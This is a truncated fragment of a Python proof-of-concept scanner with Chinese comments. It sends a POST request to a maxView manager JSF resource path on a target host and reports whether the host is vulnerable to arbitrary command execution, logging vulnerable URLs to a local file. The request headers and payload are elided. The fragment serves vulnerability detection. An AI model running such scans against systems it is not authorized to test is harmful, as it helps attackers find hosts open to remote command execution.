...
"""
    ...
    # 漏洞检测poc模块
def poc(target):
    url = target+"/maxview/manager/javax.faces.resource/dynamiccontent.properties.xhtml"
    headers={
    ...
    try:
        res = requests.post(url=url,headers=headers,data=data,verify=False,timeout=8).text
        if "system" in res:
                   with open(r'E:\Learning file\pythonxuexi\poc\poc1\rchang\mk.txt','a+') as f1:
                        f1.write(f'{url}\n')
                        print('[+++++++]'+target+'存在任意命令执行')
                        return True
        else:
             print('[-]不存在任意命令执行')
    except:
